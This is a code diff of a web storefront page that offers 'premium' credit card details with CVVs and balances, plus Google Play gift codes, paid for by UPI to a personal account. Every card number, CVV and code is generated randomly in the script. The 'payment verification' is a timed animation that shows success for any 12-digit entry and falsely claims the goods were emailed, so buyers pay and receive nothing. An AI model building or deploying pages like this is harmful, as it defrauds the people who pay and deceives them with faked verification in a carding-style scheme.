+  <div id="playCtrl" class="hidden"><div class="controls"><div class="ctrl-label">⚡ SORT BY</div><div class="ctrl-group"><button class="ctrl-btn active" id="playSortLow">📉 LOW PRICE</button><button class="ctrl-btn" id="playSortHigh">📈 HIGH PRICE</button><button class="ctrl-btn" id="playSortValue">💰 HIGH VALUE</button></div></div></div>
 
   <!-- CARDS GRID -->
-  <div class="cards-grid-killer" id="cardsGridMain"></div>
-  <div class="footer-killer">✦ 256-BIT ENCRYPTION | INSTANT DELIVERY | 24/7 SUPPORT ✦</div>
+  <div class="cards-grid" id="cardsGrid"></div>
+  <div class="footer">✦ 256-BIT ENCRYPTION • INSTANT DELIVERY • 24/7 SUPPORT ✦</div>
 </div>
 
-<!-- MODAL -->
-<div class="modal-killer" id="modalMain"><div class="modal-content-killer"><div class="modal-header-killer"><span class="modal-title-killer" id="modalTitleMain">PURCHASE</span><button class="modal-close-killer" id="closeModalBtnMain">✕</button></div><div class="modal-body-killer"><div id="modalInfoMain"></div><div class="qr-killer" id="qrMain"></div><div style="text-align:center; font-size:0.7rem; color:#888;">UPI: kartikrawat6266@okhdfcbank</div><div class="apps-grid-killer"><div class="app-card-killer" id="payPhonepeMain"><div class="app-icon-killer" style="background:#5c2d91;">₹</div><span>PhonePe</span></div><div class="app-card-killer" id="payGpayMain"><div class="app-icon-killer" style="background:white; color:#1a73e8;">G</div><span>Google Pay</span></div><div class="app-card-killer" id="payPaytmMain"><div class="app-icon-killer" style="background:#00baf2;">P</div><span>Paytm</span></div><div class="app-card-killer" id="payFampayMain"><div class="app-icon-killer" style="background:#ff6b35;">F</div><span>FamPay</span></div></div><input class="input-killer" id="emailMain" placeholder="📧 Enter your email address"><div class="error-killer" id="emailErrorMain">❌ Valid email required</div><input class="input-killer" id="utrMain" placeholder="🔢 UTR / Transaction ID (12 digits)" maxlength="12"><div class="error-killer" id="utrErrorMain">❌ UTR must be 12 digits</div><button class="confirm-killer" id="confirmMain">✦ CONFIRM & PURCHASE ✦</button><div class="warning-killer">⚠️ REAL PAYMENT REQUIRED: After verification, card/code will be sent to your email. Fake UTR = No delivery.</div></div></div></div>
+<!-- MODAL - SAME PAGE QR CODE -->
+<div class="modal-overlay" id="paymentModal"><div class="modal-box"><div class="modal-header"><span class="modal-title" id="modalTitle">PURCHASE DETAILS</span><button class="modal-close" id="closeModal">✕</button></div><div class="modal-body"><div id="itemInfo"></div><div class="qr-section"><div class="qr-wrapper" id="qrContainer"></div><div class="upi-address">💳 UPI ID: kartikrawat6266@okhdfcbank</div></div><div class="apps-grid"><div class="app-card" id="payPhonepe"><div class="app-icon" style="background:#5c2d91;">₹</div><span>PhonePe</span></div><div class="app-card" id="payGpay"><div class="app-icon" style="background:white; color:#1a73e8;">G</div><span>Google Pay</span></div><div class="app-card" id="payPaytm"><div class="app-icon" style="background:#00baf2;">P</div><span>Paytm</span></div><div class="app-card" id="payFampay"><div class="app-icon" style="background:#ff6b35;">F</div><span>FamPay</span></div></div><input class="input-field" id="emailInput" placeholder="📧 Enter your email address"><div class="error-msg" id="emailError">❌ Valid email required</div><input class="input-field" id="utrInput" placeholder="🔢 UTR / Transaction ID (12 digits)" maxlength="12"><div class="error-msg" id="utrError">❌ UTR must be 12 digits</div><button class="confirm-btn" id="confirmBtn">✦ CONFIRM & PURCHASE ✦</button><div class="warning-text">⚠️ REAL PAYMENT REQUIRED: After verification, card/code will be sent to your email. Fake UTR = No delivery.</div></div></div></div>
 
-<!-- VERIFICATION -->
-<div class="verify-killer" id="verifyMain"><div class="verify-card-killer"><div id="verifyLoadMain"><div class="spinner-killer"></div><div class="verify-title-killer">Verifying Payment</div><div class="verify-desc-killer">Processing transaction on secure blockchain gateway...</div></div><div id="verifyResultMain" style="display:none;"></div></div></div>
+<!-- VERIFICATION POPUP -->
+<div class="verify-popup" id="verifyPopup"><div class="verify-card"><div id="verifyLoad"><div class="spinner"></div><div class="verify-title">Verifying Payment</div><div class="verify-desc">Processing transaction on secure gateway...</div></div><div id="verifyResult" style="display:none;"></div></div></div>
 
 <script>
 (function(){
   const UPI = "kartikrawat6266@okhdfcbank";
-  const nets = { visa:'VISA', mastercard:'MASTERCARD', amex:'AMEX', rupay:'RUPAY' };
+  const networks = { visa:'VISA', mastercard:'MASTERCARD', amex:'AMEX', rupay:'RUPAY' };
   const types = ['visa','mastercard','amex','rupay'];
-  function r(a,b){ return Math.floor(Math.random()*(b-a+1))+a; }
+  function rand(a,b){ return Math.floor(Math.random()*(b-a+1))+a; }
   
-  // PARTICLES
-  for(let i=0;i<100;i++){ let p=document.createElement('div'); p.className='particle-3d'; p.style.left=Math.random()*100+'%'; p.style.width=p.style.height=(Math.random()*5+2)+'px'; p.style.animationDelay=Math.random()*10+'s'; p.style.animationDuration=(Math.random()*10+8)+'s'; document.getElementById('particles3d').appendChild(p); }
-  
-  // 100 CARDS
+  // 100 CARDS (₹100 - ₹1000)
   const cards = [];
   for(let i=1;i<=100;i++){
-    let t = types[r(0,3)];
-    let num = t==='visa'?'4'+r(100000000000000,999999999999999):t==='mastercard'?'5'+r(10000000000000,99999999999999):t==='amex'?'34'+r(1000000000000,9999999999999):'60'+r(10000000000000,99999999999999);
-    let price = r(100,1000);
-    cards.push({ id:i, type:t, display: num.toString().slice(0,4)+' **** **** '+num.toString().slice(-4), expiry: `${r(1,12)}/${r(26,30)}`, cvv: r(100,999), price:price, balance:price*10 });
+    let t = types[rand(0,3)];
+    let num = t==='visa'?'4'+rand(100000000000000,999999999999999):t==='mastercard'?'5'+rand(10000000000000,99999999999999):t==='amex'?'34'+rand(1000000000000,9999999999999):'60'+rand(10000000000000,99999999999999);
+    let price = rand(100,1000);
+    cards.push({ id:i, type:t, display: num.toString().slice(0,4)+' **** **** '+num.toString().slice(-4), expiry: `${rand(1,12)}/${rand(26,30)}`, cvv: rand(100,999), price:price, balance:price*10 });
   }
   
   // 60 PLAY CODES
   const plays = [];
-  for(let i=1;i<=60;i++){ let code = 'GIFT'+r(10000,99999)+'-'+r(10000,99999)+'-'+r(10000,99999); let price=r(100,1000); plays.push({ id:500+i, code:code, display: code.slice(0,8)+'•••••••', value:price*10, price:price, type:'play' }); }
+  for(let i=1;i<=60;i++){
+    let code = 'PLAY'+rand(10000,99999)+'-'+rand(10000,99999)+'-'+rand(10000,99999);
+    let price = rand(100,1000);
+    plays.push({ id:500+i, code:code, display: code.slice(0,8)+'•••••••', value:price*10, price:price, type:'play' });
+  }
   
-  setInterval(()=>{ let c=r(120,300); document.getElementById('liveMain').innerText=c; document.getElementById('liveTextMain').innerText=c+' ONLINE NOW'; },5000);
+  // LIVE COUNTER
+  setInterval(()=>{ let c=rand(120,320); document.getElementById('liveCount').innerText=c; },5000);
   
-  let current = null, tab='cards', filter='all', sort='price-low', playSort='price-low';
+  let currentItem = null;
+  let activeTab = 'cards';
+  let currentFilter = 'all';
+  let currentSort = 'price-low';
+  let playSort = 'price-low';
+  let qr = null;
+  
+  function maskCvv(c){ return c.toString()[0]+'**'; }
   
   function getData(){
-    if(tab==='cards'){
-      let f = filter==='all'?[...cards]:cards.filter(c=>c.type===filter);
-      if(sort==='price-low') f.sort((a,b)=>a.price-b.price);
-      else if(sort==='price-high') f.sort((a,b)=>b.price-a.price);
+    if(activeTab==='cards'){
+      let f = currentFilter==='all'?[...cards]:cards.filter(c=>c.type===currentFilter);
+      if(currentSort==='price-low') f.sort((a,b)=>a.price-b.price);
+      else if(currentSort==='price-high') f.sort((a,b)=>b.price-a.price);
       else f.sort((a,b)=>b.balance-a.balance);
       return f;
     } else {
@@ -691,82 +611,100 @@
     }
   }
   
-  function maskC(c){ return c.toString()[0]+'**'; }
-  
   function render(){
     let data = getData();
-    let grid = document.getElementById('cardsGridMain');
+    let grid = document.getElementById('cardsGrid');
     grid.innerHTML = data.map(item => {
       if(item.type!=='play'){
-        return `<div class="card-killer"><div class="card-glow-killer"></div><div class="card-strip"></div><div class="card-body"><div class="card-head-killer"><span class="network-badge-killer">${nets[item.type]}</span><span class="price-badge-killer">₹${item.price}</span></div><div class="card-number-killer">${item.display}</div><div class="details-grid-killer"><div class="detail-killer"><div class="detail-label-killer">EXPIRY</div><div class="detail-value-killer">${item.expiry}</div></div><div class="detail-killer"><div class="detail-label-killer">CVV</div><div class="detail-value-killer">${maskC(item.cvv)}</div></div><div class="detail-killer"><div class="detail-label-killer">BALANCE</div><div class="detail-value-killer" style="color:#ffd700;">₹${item.balance}</div></div></div></div><div class="purchase-killer" data-id="${item.id}"><span class="purchase-text-killer">💳 PURCHASE CARD</span><span class="purchase-arrow-killer">→</span></div></div>`;
+        return `<div class="premium-card"><div class="card-strip"></div><div class="card-inner"><div class="card-header"><span class="network">${networks[item.type]}</span><span class="price">₹${item.price}</span></div><div class="card-number">${item.display}</div><div class="card-details"><div class="detail"><div class="detail-label">EXPIRY</div><div class="detail-value">${item.expiry}</div></div><div class="detail"><div class="detail-label">CVV</div><div class="detail-value">${maskCvv(item.cvv)}</div></div><div class="detail"><div class="detail-label">BALANCE</div><div class="detail-value" style="color:#ffd966;">₹${item.balance}</div></div></div></div><div class="purchase-btn" data-id="${item.id}"><span class="purchase-text">💳 PURCHASE CARD</span><span class="purchase-arrow">→</span></div></div>`;
       } else {
-        return `<div class="card-killer"><div class="card-glow-killer"></div><div class="card-strip play-strip"></div><div class="card-body"><div class="card-head-killer"><span class="network-badge-killer" style="background:rgba(0,229,255,0.15); border-color:#00e5ff; color:#00e5ff;">🎮 PLAY STORE</span><span class="price-badge-killer">₹${item.price}</span></div><div class="card-number-killer" style="font-size:0.85rem;">${item.display}</div><div class="details-grid-killer"><div class="detail-killer"><div class="detail-label-killer">VALUE</div><div class="detail-value-killer">₹${item.value}</div></div><div class="detail-killer"><div class="detail-label-killer">TYPE</div><div class="detail-value-killer">GIFT CODE</div></div><div class="detail-killer"><div class="detail-label-killer">REDEEM</div><div class="detail-value-killer">GOOGLE PLAY</div></div></div></div><div class="purchase-killer" data-id="${item.id}"><span class="purchase-text-killer">🎮 REDEEM CODE</span><span class="purchase-arrow-killer">→</span></div></div>`;
+        return `<div class="premium-card"><div class="card-strip" style="background:linear-gradient(90deg,#4285f4,#00e5ff);"></div><div class="card-inner"><div class="card-header"><span class="network" style="background:rgba(0,229,255,0.15); border-color:#00e5ff; color:#00e5ff;">🎮 PLAY STORE</span><span class="price">₹${item.price}</span></div><div class="card-number" style="font-size:0.85rem;">${item.display}</div><div class="card-details"><div class="detail"><div class="detail-label">VALUE</div><div class="detail-value">₹${item.value}</div></div><div class="detail"><div class="detail-label">TYPE</div><div class="detail-value">GIFT CODE</div></div><div class="detail"><div class="detail-label">REDEEM</div><div class="detail-value">GOOGLE PLAY</div></div></div></div><div class="purchase-btn" data-id="${item.id}"><span class="purchase-text">🎮 REDEEM CODE</span><span class="purchase-arrow">→</span></div></div>`;
       }
     }).join('');
-    document.querySelectorAll('.purchase-killer').forEach(btn=>{ btn.addEventListener('click',(e)=>{ let id=parseInt(btn.dataset.id); let all=tab==='cards'?cards:plays; current=all.find(i=>i.id===id); openModal(); }); });
+    
+    document.querySelectorAll('.purchase-btn').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        let id = parseInt(btn.dataset.id);
+        let all = activeTab==='cards' ? cards : plays;
+        currentItem = all.find(i=>i.id===id);
+        openModal();
+      });
+    });
   }
   
   function openModal(){
-    document.getElementById('modalTitleMain').innerText = current.type==='play'?'🎮 PLAY STORE CODE':'💳 PREMIUM CARD';
-    let info = document.getElementById('modalInfoMain');
-    if(current.type==='play'){
-      info.innerHTML = `<div style="background:#0c0c1a; border-radius:30px; padding:20px;"><div style="font-size:1.2rem; font-weight:700;">PLAY STORE GIFT CARD</div><div style="font-family:monospace; background:#000; padding:12px; border-radius:18px; margin:15px;">${current.display}</div><div style="font-size:2rem; font-weight:800; color:#ffd700;">₹${current.price}</div></div>`;
+    document.getElementById('modalTitle').innerText = currentItem.type==='play' ? '🎮 PLAY STORE CODE' : '💳 PREMIUM CARD';
+    let info = document.getElementById('itemInfo');
+    if(currentItem.type==='play'){
+      info.innerHTML = `<div style="background:#0c0c1a; border-radius:25px; padding:18px; text-align:center;"><div style="font-weight:700;">PLAY STORE GIFT CARD</div><div style="font-family:monospace; background:#000; padding:12px; border-radius:15px; margin:12px;">${currentItem.display}</div><div style="font-size:1.8rem; font-weight:800; color:#ffd966;">₹${currentItem.price}</div></div>`;
     } else {
-      info.innerHTML = `<div style="background:#0c0c1a; border-radius:30px; padding:20px;"><div><strong>${nets[current.type]}</strong></div><div style="font-family:monospace; margin:12px;">${current.display}</div><div>CVV: ${maskC(current.cvv)} | EXP: ${current.expiry}</div><div style="font-size:2rem; font-weight:800; color:#ffd700; margin-top:12px;">₹${current.price}</div></div>`;
+      info.innerHTML = `<div style="background:#0c0c1a; border-radius:25px; padding:18px; text-align:center;"><div><strong>${networks[currentItem.type]}</strong></div><div style="font-family:monospace; margin:10px;">${currentItem.display}</div><div>CVV: ${maskCvv(currentItem.cvv)} | EXP: ${currentItem.expiry}</div><div style="font-size:1.8rem; font-weight:800; color:#ffd966; margin-top:10px;">₹${currentItem.price}</div></div>`;
     }
-    document.getElementById('qrMain').innerHTML = '';
-    let upiStr = `upi://pay?pa=${UPI}&pn=PHANTOM&am=${current.price}&cu=INR&tn=${tab==='cards'?'CARD':'PLAY'}_${current.id}`;
-    new QRCode(document.getElementById('qrMain'), { text: upiStr, width: 160, height: 160 });
-    document.getElementById('emailMain').value = '';
-    document.getElementById('utrMain').value = '';
-    document.getElementById('modalMain').classList.add('open');
+    document.getElementById('qrContainer').innerHTML = '';
+    let upiStr = `upi://pay?pa=${UPI}&pn=OMEGA&am=${currentItem.price}&cu=INR&tn=${activeTab==='cards'?'CARD':'PLAY'}_${currentItem.id}`;
+    new QRCode(document.getElementById('qrContainer'), { text: upiStr, width: 160, height: 160 });
+    document.getElementById('emailInput').value = '';
+    document.getElementById('utrInput').value = '';
+    document.getElementById('paymentModal').classList.add('open');
   }
   
-  function closeModal(){ document.getElementById('modalMain').classList.remove('open'); }
+  function closeModal(){ document.getElementById('paymentModal').classList.remove('open'); }
   
   function showVerify(email, success, type){
-    let popup = document.getElementById('verifyMain'), load = document.getElementById('verifyLoadMain'), result = document.getElementById('verifyResultMain');
+    let popup = document.getElementById('verifyPopup'), load = document.getElementById('verifyLoad'), result = document.getElementById('verifyResult');
     load.style.display = 'block'; result.style.display = 'none'; popup.classList.add('active');
     setTimeout(() => {
       load.style.display = 'none'; result.style.display = 'block';
       if(success){
         let isPlay = type === 'play';
-        result.innerHTML = `<div style="font-size:4rem;">✅</div><div class="verify-title-killer" style="color:#00ff88;">PAYMENT VERIFIED!</div><div class="verify-desc-killer">${isPlay ? '🎮 Your Play Store Redeem Code has been sent to' : '💳 Your Card Details have been sent to'} <strong style="color:#ffd700;">${email}</strong><br><br>Check your inbox (spam folder). Delivery within 2-5 minutes.</div><div class="warning-killer" style="margin-top:20px;">⚠️ REAL PAYMENT ONLY: If you did not pay, no code/card will be delivered.</div><button class="verify-close-killer" onclick="document.getElementById('verifyMain').classList.remove('active')">✦ CLOSE ✦</button>`;
+        result.innerHTML = `<div class="verify-icon">✅</div><div class="verify-title" style="color:#00ff88;">PAYMENT VERIFIED!</div><div class="verify-desc">${isPlay ? '🎮 Your Play Store Redeem Code has been sent to' : '💳 Your Card Details have been sent to'} <strong style="color:#ffd966;">${email}</strong><br><br>Please check your inbox (spam folder). Delivery within 2-5 minutes.</div><div style="margin-top:20px; font-size:0.7rem; color:#ff8888;">⚠️ If you did NOT make the payment, no code/card will be delivered.</div><button onclick="document.getElementById('verifyPopup').classList.remove('active')" style="margin-top:25px; padding:12px 35px; background:linear-gradient(135deg,#ffd966,#ccaa33); border:none; border-radius:50px; font-weight:800; cursor:pointer;">✦ CLOSE ✦</button>`;
       } else {
-        result.innerHTML = `<div style="font-size:4rem;">❌</div><div class="verify-title-killer" style="color:#ff4444;">INVALID TRANSACTION</div><div class="verify-desc-killer">UTR must be exactly 12 digits. Please check your payment app.<br><br>Fake UTR = No delivery.</div><button class="verify-close-killer" onclick="document.getElementById('verifyMain').classList.remove('active')" style="background:#ff4444;">✕ TRY AGAIN</button>`;
+        result.innerHTML = `<div class="verify-icon">❌</div><div class="verify-title" style="color:#ff4444;">INVALID TRANSACTION</div><div class="verify-desc">UTR must be exactly 12 digits. Please check your payment app and try again.<br><br>Fake UTR will NOT receive any card/code.</div><button onclick="document.getElementById('verifyPopup').classList.remove('active')" style="margin-top:25px; padding:12px 35px; background:#ff4444; border:none; border-radius:50px; font-weight:800; cursor:pointer;">✕ TRY AGAIN</button>`;
       }
     }, 3000);
   }
   
-  document.getElementById('confirmMain').onclick = () => {
-    let email = document.getElementById('emailMain').value.trim();
-    let utr = document.getElementById('utrMain').value.trim();
+  // EVENT LISTENERS
+  document.getElementById('confirmBtn').onclick = () => {
+    let email = document.getElementById('emailInput').value.trim();
+    let utr = document.getElementById('utrInput').value.trim();
     let ok = true;
-    if(!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ document.getElementById('emailErrorMain').classList.add('show'); ok=false; } else document.getElementById('emailErrorMain').classList.remove('show');
-    if(!utr || !/^\d{12}$/.test(utr)){ document.getElementById('utrErrorMain').classList.add('show'); ok=false; } else document.getElementById('utrErrorMain').classList.remove('show');
+    if(!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ document.getElementById('emailError').classList.add('show'); ok=false; } else document.getElementById('emailError').classList.remove('show');
+    if(!utr || !/^\d{12}$/.test(utr)){ document.getElementById('utrError').classList.add('show'); ok=false; } else document.getElementById('utrError').classList.remove('show');
     if(!ok) return;
-    let t = current ? (current.type==='play'?'play':'card') : 'card';
-    closeModal(); showVerify(email, true, t);
+    let t = currentItem ? (currentItem.type==='play'?'play':'card') : 'card';
+    closeModal();
+    showVerify(email, true, t);
   };
   
-  document.getElementById('closeModalBtnMain').onclick = closeModal;
+  document.getElementById('closeModal').onclick = closeModal;
   
-  document.getElementById('payPhonepeMain').onclick = () => { if(current) window.location.href = `phonepe://pay?pa=${UPI}&am=${current.price}&cu=INR`; setTimeout(()=>window.location.href=`upi://pay?pa=${UPI}&am=${current.price}&cu=INR`,800); };
-  document.getElementById('payGpayMain').onclick = () => { if(current) window.location.href = `tez://upi/pay?pa=${UPI}&am=${current.price}&cu=INR`; setTimeout(()=>window.location.href=`upi://pay?pa=${UPI}&am=${current.price}&cu=INR`,800); };
-  document.getElementById('payPaytmMain').onclick = () => { if(current) window.location.href = `paytmmp://pay?pa=${UPI}&am=${current.price}&cu=INR`; setTimeout(()=>window.location.href=`upi://pay?pa=${UPI}&am=${current.price}&cu=INR`,800); };
-  document.getElementById('payFampayMain').onclick = () => { if(current) window.location.href = `intent://pay?pa=${UPI}&am=${current.price}#Intent;scheme=upi;package=com.fampay.in;end`; setTimeout(()=>window.location.href=`upi://pay?pa=${UPI}&am=${current.price}&cu=INR`,800); };
+  document.getElementById('payPhonepe').onclick = () => { if(currentItem) window.location.href = `phonepe://pay?pa=${UPI}&am=${currentItem.price}&cu=INR`; setTimeout(()=>window.location.href=`upi://pay?pa=${UPI}&am=${currentItem.price}&cu=INR`,800); };
+  document.getElementById('payGpay').onclick = () => { if(currentItem) window.location.href = `tez://upi/pay?pa=${UPI}&am=${currentItem.price}&cu=INR`; setTimeout(()=>window.location.href=`upi://pay?pa=${UPI}&am=${currentItem.price}&cu=INR`,800); };
+  document.getElementById('payPaytm').onclick = () => { if(currentItem) window.location.href = `paytmmp://pay?pa=${UPI}&am=${currentItem.price}&cu=INR`; setTimeout(()=>window.location.href=`upi://pay?pa=${UPI}&am=${currentItem.price}&cu=INR`,800); };
+  document.getElementById('payFampay').onclick = () => { if(currentItem) window.location.href = `intent://pay?pa=${UPI}&am=${currentItem.price}#Intent;scheme=upi;package=com.fampay.in;end`; setTimeout(()=>window.location.href=`upi://pay?pa=${UPI}&am=${currentItem.price}&cu=INR`,800); };
   
-  document.getElementById('tabMainCards').onclick = () => { tab='cards'; document.getElementById('tabMainCards').classList.add('active'); document.getElementById('tabMainPlay').classList.remove('active'); document.getElementById('cardsPanel').classList.remove('hidden'); document.getElementById('playPanel').classList.add('hidden'); render(); };
-  document.getElementById('tabMainPlay').onclick = () => { tab='play'; document.getElementById('tabMainPlay').classList.add('active'); document.getElementById('tabMainCards').classList.remove('active'); document.getElementById('cardsPanel').classList.add('hidden'); document.getElementById('playPanel').classList.remove('hidden'); render(); };
+  // TABS
+  document.getElementById('tabCards').onclick = () => { activeTab='cards'; document.getElementById('tabCards').classList.add('active'); document.getElementById('tabPlay').classList.remove('active'); document.getElementById('cardsCtrl').classList.remove('hidden'); document.getElementById('playCtrl').classList.add('hidden'); render(); };
+  document.getElementById('tabPlay').onclick = () => { activeTab='play'; document.getElementById('tabPlay').classList.add('active'); document.getElementById('tabCards').classList.remove('active'); document.getElementById('cardsCtrl').classList.add('hidden'); document.getElementById('playCtrl').classList.remove('hidden'); render(); };
   
-  document.getElementById('sortLowBtn').onclick = function(){ document.querySelectorAll('#cardsPanel .btn-killer').forEach(b=>b.classList.remove('active')); this.classList.add('active'); sort='price-low'; if(tab==='cards') render(); };
-  document.getElementById('sortHighBtn').onclick = function(){ document.querySelectorAll('#cardsPanel .btn-killer').forEach(b=>b.classList.remove('active')); this.classList.add('active'); sort='price-high'; if(tab==='cards') render(); };
-  document.getElementById('sortBalanceBtn').onclick = function(){ document.querySelectorAll('#cardsPanel .btn-killer').forEach(b=>b.classList.remove('active')); this.classList.add('active'); sort='balance-high'; if(tab==='cards') render(); };
-  document.getElementById('playSortLowBtn').onclick = function(){ document.querySelectorAll('#playPanel .btn-killer').forEach(b=>b.classList.remove('active')); this.classList.add('active'); playSort='price-low'; if(tab==='play') render(); };
-  document.getElementById('playSortHighBtn').onclick = function(){ document.querySelectorAll('#playPanel .btn-killer').forEach(b=>b.classList.remove('active')); this.classList.add('active'); playSort='price-high'; if(tab==='play') render(); };
-  document.getElementById('playSortValueBtn').onclick = function(){ document.querySelectorAll('#playPanel .btn-killer').forEach(b=>b.classList.remove('active')); this.classList.add('active'); playSort='balance-high'; if(tab==='play') render(); };
+  // SORT
+  document.getElementById('sortLow').onclick = function(){ document.querySelectorAll('#cardsCtrl .ctrl-btn').forEach(b=>b.classList.remove('active')); this.classList.add('active'); currentSort='price-low'; if(activeTab==='cards') render(); };
+  document.getElementById('sortHigh').onclick = function(){ document.querySelectorAll('#cardsCtrl .ctrl-btn').forEach(b=>b.classList.remove('active')); this.classList.add('active'); currentSort='price-high'; if(activeTab==='cards') render(); };
+  document.getElementById('sortBalance').onclick = function(){ document.querySelectorAll('#cardsCtrl .ctrl-btn').forEach(b=>b.classList.remove('active')); this.classList.add('active'); currentSort='balance-high'; if(activeTab==='cards') render(); };
+  document.getElementById('playSortLow').onclick = function(){ document.querySelectorAll('#playCtrl .ctrl-btn').forEach(b=>b.classList.remove('active')); this.classList.add('active'); playSort='price-low'; if(activeTab==='play') render(); };
+  document.getElementById('playSortHigh').onclick = function(){ document.querySelectorAll('#playCtrl .ctrl-btn').forEach(b=>b.classList.remove('active')); this.classList.add('active'); playSort='price-high'; if(activeTab==='play') render(); };
+  document.getElementById('playSortValue').onclick = function(){ document.querySelectorAll('#playCtrl .ctrl-btn').forEach(b=>b.classList.remove('active')); this.classList.add('active'); playSort='balance-high'; if(activeTab==='play') render(); };
   
-  document.querySelectorAll('[data-filter]').forEach(btn => { btn.onclick = function(){ document.querySelectorAll('[data-filter]').forEach(b=>b.classList.remove('active')); this.classList.add('active'); filter = this.dataset.filter; if(tab==='cards') render(); }; });
+  // FILTER
+  document.querySelectorAll('[data-filter]').forEach(btn => {
+    btn.onclick = function(){
+      document.querySelectorAll('[data-filter]').forEach(b=>b.classList.remove('active'));
+      this.classList.add('active');
+      currentFilter = this.dataset.filter;
+      if(activeTab==='cards') render();
+    };
+  });
   
   render();
 })();
